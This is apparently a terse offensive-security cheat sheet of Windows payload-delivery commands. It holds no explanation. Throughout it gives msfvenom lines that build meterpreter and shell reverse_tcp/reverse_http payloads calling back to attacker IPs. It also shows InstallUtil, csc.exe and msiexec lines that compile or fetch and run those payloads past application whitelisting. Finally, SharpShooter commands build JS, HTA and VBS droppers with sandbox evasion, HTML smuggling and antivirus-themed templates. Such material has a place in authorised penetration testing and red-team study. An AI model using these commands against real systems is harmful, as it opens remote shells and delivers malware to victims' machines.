
```
msfvenom -a x86_64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f csharp
msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f csharp > shellcode.txt

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /target:library /out:test.exe /platform:x64 /unsafe C:\Users\Commando\Desktop\MSF_Payload.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\John\Desktop\Micropoor.exe

```
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.174.134 LPORT=4444 - f msi > qing.txt
C:\Windows\System32\msiexec.exe /q /i http://192.168.174.134 /qing.txt
```

```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.2 LPORT=1337 EnableStageEncoding=True PrependMigrate=True -f raw -o payload.txt

#Stageless JavaScript
python SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./payload.txt --sandbox 1=contoso,2,3

#Stageless HTA
python SharpShooter.py --stageless --dotnetver 4 --payload hta --output foo --rawscfile ./payload.txt --com wscript --awl wmic --awlurl http://10.0.1.200/foo.xsl --smuggle --template mcafee

#Staged VBS
python SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```
